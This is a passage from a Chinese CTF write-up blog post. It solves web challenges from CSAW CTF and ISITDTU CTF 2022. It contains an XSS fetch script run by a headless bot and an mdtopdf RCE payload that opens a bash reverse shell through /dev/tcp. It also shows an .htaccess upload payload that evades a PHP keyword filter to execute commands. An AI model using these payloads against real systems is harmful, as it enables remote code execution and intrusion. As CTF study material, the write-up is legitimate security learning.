+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Ncat: Connection from 35.88.90.167.</span><br><span class="line">Ncat: Connection from 35.88.90.167:59630.</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: myIp:23333</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/106.0.5249.0 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://localhost:44791</span><br><span class="line">Referer: http://localhost:44791/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US</span><br></pre></td></tr></table></figure></div>
+
+<p>得到的回显如上，接收到一些信息，如UA和Origin：<a class="link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1467299" >host、referer和origin的区别 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
+<p>若是使用https协议访问服务器，会导致服务器接受到乱码信息</p>
+<p>由于origin显示的是服务器的地址，因此它应该可以访问自己，尝试访问其本地的内容并将其渲染出来：</p>
+<div class="highlight-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line">fetch(&#x27;/&#x27;)</span><br><span class="line"><span class="code">	.then(response =&gt; response.text())</span></span><br><span class="line"><span class="code">	.then(data =&gt; document.write(&quot; &lt;pre&gt; &quot;+data));</span></span><br><span class="line"><span class="code">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这里的主要问题在于如何将fetch到的内容渲染出来，一方面使用document.write(str)将字符串写入当前的文件中，另一方面fetch返回的response中 <code>text()</code> 函数对应于 <code>json()</code> 可以将访问得到响应内容的主体部分，也就是HTML内容以文本的形式返回回来。（一开始遇到的主要问题是不知道这个response到底把HTML内容放哪去了）由于写进去的是字符串内容，可以直接在前面连接一个 <code>&lt;pre&gt;</code> 标签，保留目标内容中的空白字符，使得展示的内容有缩进。（直接展示会合并空白字符导致可读性差）</p>
+<p>进去以后会发现有个node.js存放依赖列表的package.json文件，其中有个依赖是”mdtopdf 4.0.0”，搜索相关的CVE会发现它在5.0.0版本前有个RCE漏洞，直接搜索可找到<a class="link"   target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880" >PoC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，将payload换成revshell内容即可：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---js</span><br><span class="line">((require(&quot;child_process&quot;)).execSync(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/23333 0&gt;&amp;1 &#x27;&quot;))</span><br><span class="line">---RCE</span><br></pre></td></tr></table></figure></div>
+
+<p>PoC中的第一个n其实是\n，而且这个漏洞看起来非常的奇怪，也不知道是怎么实现的rce（好像这诡异的注释都是RCE的原因）</p>
+<p>由于默认的shell是sh，而sh没法revshell，因此手动用bash读取命令，最后的单双引号中至少要有一个前面有一个空格，否则就无法成功，原因不明。</p>
+<p>得到shell后直接 <code>cat /flag.txt</code> 即可得到flag：<code>CTF&#123;pdf_c0nt1nu3s_70_5uCK&#125;</code></p>
+<h1 id="ISITDTUCTF"><a href="#ISITDTUCTF" class="headerlink" title="ISITDTUCTF"></a>ISITDTUCTF</h1><h2 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB"></a>WEB</h2><h3 id="UploadEz"><a href="#UploadEz" class="headerlink" title="UploadEz"></a>UploadEz</h3><p>网页源码：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag</span></span><br><span class="line"><span class="comment">//Attempt to upload failed, you have to start over</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(on|flag|index|cat|file)/i&#x27;</span>, <span class="variable">$shell</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Try hard broooooo !!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z.]/&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Try hard broooooo !!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$shell</span> . <span class="string">&quot;\nWelcome to ISITDTU CTF 2022&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>有一个 <code>file_put_contents($filename,$shell.&quot;\nWelcome to ISITDTU CTF 2022&quot;);</code>  效果是将shell中的内容接上一段文本写到filename文件中。因此相当于可以上传文件。</p>
+<p>起初的思路是上传一个php脚本然后直接访问执行，但是在Apache的配置文件”000-default.conf”中：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Location /&gt;</span><br><span class="line">    AllowOverride all</span><br><span class="line">    Require all granted</span><br><span class="line">&lt;/Location&gt;</span><br><span class="line">&lt;Location /index.php&gt;</span><br><span class="line">    php_admin_flag engine on</span><br><span class="line">&lt;/Location&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>服务器规定只对index.php进行php解析，尽管”index”没被过滤，但无法覆盖index.php。</p>
+<p>留意到配置中打开了 <code>AllowOverride all</code> ，”.htaccess”文件被启用了，所以可以通过上传”.htaccess”来修改服务器配置，从而执行原本不能执行的php脚本。.htaccess:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le .htaccess</span><br><span class="line">#&lt;?php echo exec(&#x27;nl /*&#x27;); ?&gt;</span><br><span class="line">#\</span><br><span class="line">Welcome to ISITDTU CTF 2022#</span><br></pre></td></tr></table></figure></div>
+
+<p><code>php_value auto_prepend_file qwq.txt</code> 会在主网页被解析之前先解析所选中的文件”qwq.txt”，因此就可以执行木马命令。不合格式的内容会污染”.htaccess”文件，导致服务器配置混乱，直接炸掉，因此需要用”#”注释掉脏内容。</p>
+<p>“\“可以连接两行的内容（感觉是转义的跨行连接），一方面绕过对”file”字符的过滤，一方面注释掉连接的冗余内容（冗余内容前面有个换行，不能直接注释掉）。而解析php时”#”并不是注释，不影响php执行。</p>
+<p>payload：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=.htaccess&amp;shell=php_value auto_prepend_fi\%0ale .htaccess %0a %23 &lt;?php system(&#x27;ca&#x27;.&#x27;t /fl&#x27;.&#x27;ag&#x27;); ?&gt;%0a%23\</span><br></pre></td></tr></table></figure></div>
+
+<p>Little Tips：</p>
+<ol>
+<li>“?&gt;”不能缺少，否则php解析会失败；</li>
+<li><code>exec</code> 需要加上echo，且只会返回执行结果的第一项，最好采用 <code>system()</code> ；</li>
+<li>“\n#\“换成”#\\n”就戳啦；</li>
+<li>输入时”#”要写成”%23”，井号本身有特殊含义；</li>
+<li>GET传入键值时等号后的内容原样输入支持空格，因此引号也会被读入，同时框内的内容也不用反斜杠转义，因为可以采用URL编码，因此传反斜杠时会原样输入进去。</li>
+</ol>
+<p>参考：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/116666720" >.htaccess的使用技巧总结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<!-- flag of hidden posts -->
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> CTF比赛复盘（三）</li>
+        <li><strong>Author:</strong> Forestsetyou</li>
+        <li><strong>Created at
+                :</strong> 2022-11-19 18:55:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2023-01-11 16:19:00
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://forestsetyou.github.io/2022/11/19/Security/CTF/CTF比赛复盘（三）/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">CTF比赛复盘（三）</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#HackerGame-2022"><span class="nav-text">HackerGame-2022</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Xcaptcha"><span class="nav-text">Xcaptcha</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%B6%E7%9B%AE%E5%BD%95%E9%87%8C%E7%9A%84%E7%A7%98%E5%AF%86"><span class="nav-text">家目录里的秘密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%872-0"><span class="nav-text">旅行照片2.0</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CSAWCTF"><span class="nav-text">CSAWCTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Word-wide-web"><span class="nav-text">Word wide web</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#My-little-website"><span class="nav-text">My little website</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ISITDTUCTF"><span class="nav-text">ISITDTUCTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-1"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#UploadEz"><span class="nav-text">UploadEz</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Forestsetyou</a>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
